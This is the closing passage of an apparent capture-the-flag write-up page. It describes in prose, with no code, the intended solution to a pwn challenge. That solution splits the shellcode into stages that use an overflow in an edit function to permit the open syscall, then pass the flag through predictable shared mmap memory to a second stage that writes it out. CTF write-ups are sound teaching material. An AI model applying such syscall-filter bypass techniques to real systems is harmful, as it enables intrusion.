+<p>As I mentioned earlier, I mistakingly thought that stdin and stdout would always be closed., which is not the case. As i read on the official discord, the intended solution is to split the exploit into multiple parts: 1 to open and read the flag, another to write the flag to stdout. The first would use the overflow in the edit function to allow the open syscall, the other would be of type write. As mmap memory segments are predictable, the second shellcode can read a flag deposited by the first shellcode. This is possible, because of how mmap can share memory between the processes. I initially though this was impossible, guess I learned something new :)</p>
+<p>Funnily enough, the only other solution I could find used the exact same exploit described in this writeup. Goes to show that vulnerabilities are everywhere.</p>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
